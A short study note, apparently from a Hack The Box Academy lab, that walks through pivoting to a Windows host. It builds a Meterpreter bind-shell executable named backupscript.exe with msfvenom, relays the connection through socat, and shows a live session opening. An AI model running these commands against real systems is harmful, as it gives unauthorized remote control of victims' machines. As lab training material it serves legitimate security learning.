Socat Redirection with a Bind Shell
###################################

Date: 2024-11-02 14:33

Status:

Tags: 


Description
***********

The Windows server starts a listener and binds to a port.  The socat listener on the pivot host in this example listens for requests
from the Meterpreter on the attack host and forwards that to the Windows bind shell.


Step 1:  Create the Windows payload

.. code-block::

    msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443

Move the payload to the Windows host and start it up.    

Step 2: Start the socat bind shell listener on the pivot host

.. code-block:: console

    ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443


Step 3: Start the multi handler

.. code-block:: console

    msf6 > use exploit/multi/handler

    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
    payload => windows/x64/meterpreter/bind_tcp
    msf6 exploit(multi/handler) > set RHOST 10.129.202.64
    RHOST => 10.129.202.64
    msf6 exploit(multi/handler) > set LPORT 8080
    LPORT => 8080
    msf6 exploit(multi/handler) > run

    [*] Started bind TCP handler against 10.129.202.64:8080

Use the shell created in Meterpreter 

.. code-block:: console

    [*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor


References 
***********
https://academy.hackthebox.com/module/158/section/1429